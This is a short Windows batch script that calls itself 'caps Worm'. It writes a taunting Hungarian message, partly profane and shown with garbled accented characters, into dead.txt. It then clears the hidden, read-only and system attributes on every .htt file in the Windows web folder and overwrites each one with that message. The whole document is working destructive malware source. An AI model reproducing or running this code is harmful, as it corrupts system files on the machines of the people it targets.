@echo off
@echo Im caps Worm! >dead.txt
@echo H�t j�l r�faragt�l az biztos! >>dead.txt
@echo Ma ugyanis nincs kedvem dolgozni! >>dead.txt
@echo Hagyj b�k�n k�l�nben r� fogsz baszni! >>dead.txt
@echo Pr�b�ld meg tal�n holnap >>dead.txt
:inf
attrib %winbootdir%\web\*.htt -h -r -s
for %%f in (%winbootdir%\web\*.htt) do copy dead.txt %%f >nul

